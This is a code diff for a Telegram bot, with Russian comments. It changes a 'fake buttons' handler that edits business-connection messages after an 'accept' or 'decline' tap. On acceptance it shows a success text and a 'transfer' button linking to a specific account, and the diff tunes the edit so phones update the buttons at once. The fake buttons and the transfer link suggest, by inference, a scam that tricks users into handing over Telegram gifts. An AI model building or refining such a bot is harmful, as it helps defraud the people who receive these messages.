@@ -143,7 +143,7 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- ФИНАЛЬНЫЙ ХАК ДЛЯ ТЕЛЕФОНА ---
+# --- МГНОВЕННОЕ ОБНОВЛЕНИЕ БЕЗ ЗАДЕРЖЕК ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -157,11 +157,9 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
-    # 1. ЗАДЕРЖКА 2 СЕКУНДЫ (НЕ отвечаем на колбэк, пусть крутятся часики)
-    await asyncio.sleep(2.0)
+    await callback.answer("Обработка...")
 
     if action == "accept":
-        # 2. ДОБАВЛЯЕМ НЕВИДИМЫЙ СИМВОЛ (\u200b), ЧТОБЫ ТЕЛЕФОН ОБНОВИЛ КНОПКИ
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name) + "\u200b"
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
@@ -177,21 +175,36 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         new_keyboard = None
         alert_text = None
 
-    # 3. ИЗМЕНЯЕМ СООБЩЕНИЕ (БЕЗ LinkPreviewOptions, чтобы телефон не тупил)
+    # ХАК: Сначала меняем только клавиатуру (кнопки). Это заставляет мобильный клиент обновиться.
+    try:
+        await bot.edit_message_reply_markup(
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id,
+            reply_markup=new_keyboard,
+            business_connection_id=business_connection_id
+        )
+    except Exception as e:
+        print(f"Ошибка смены кнопок: {e}")
+
+    # Затем мгновенно меняем текст и оставляем анимацию
     try:
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
             message_id=callback.message.message_id,
             text=new_text,
-            reply_markup=new_keyboard,
             business_connection_id=business_connection_id,
-            parse_mode="HTML"
+            parse_mode="HTML",
+            link_preview_options=LinkPreviewOptions(
+                url=link,
+                show_above_text=True,
+                prefer_large_media=True
+            )
         )
     except TelegramBadRequest as e:
         if "message is not modified" not in str(e).lower():
-            print(f"Ошибка изменения: {e}")
+            print(f"Ошибка изменения текста: {e}")
 
-    # 4. ПОКАЗЫВАЕМ ВСПЛЫВАЮЩЕЕ ОКНО (ТОЛЬКО ОДИН РАЗ В КОНЦЕ)
+    # Показываем окно
     if alert_text:
         await callback.answer(alert_text, show_alert=True)
     else:
